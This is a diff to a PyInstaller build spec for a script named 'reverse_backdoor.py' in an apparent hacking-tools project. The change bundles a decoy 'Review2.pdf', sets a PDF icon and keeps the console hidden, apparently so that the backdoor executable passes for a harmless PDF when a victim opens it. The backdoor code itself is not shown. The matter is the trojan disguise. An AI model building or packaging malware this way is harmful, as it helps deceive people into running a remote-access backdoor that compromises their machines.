@@ -4,9 +4,9 @@ block_cipher = None
 
 
 a = Analysis(['reverse_backdoor.py'],
-             pathex=['Z:\\root\\PycharmProjects\\GvR_Tools\\reverse_connection'],
+             pathex=['R:\\Development\\Python\\Hacking_Tools\\reverse_connection'],
              binaries=[],
-             datas=[('/root/Downloads/sample.txt', '.')],
+             datas=[('Review2.pdf', '.')],
              hiddenimports=[],
              hookspath=[],
              runtime_hooks=[],
@@ -30,4 +30,4 @@ exe = EXE(pyz,
           upx=True,
           upx_exclude=[],
           runtime_tmpdir=None,
-          console=False , icon='\\root\\Downloads\\txt.ico')
+          console=False , icon='pdf.ico')
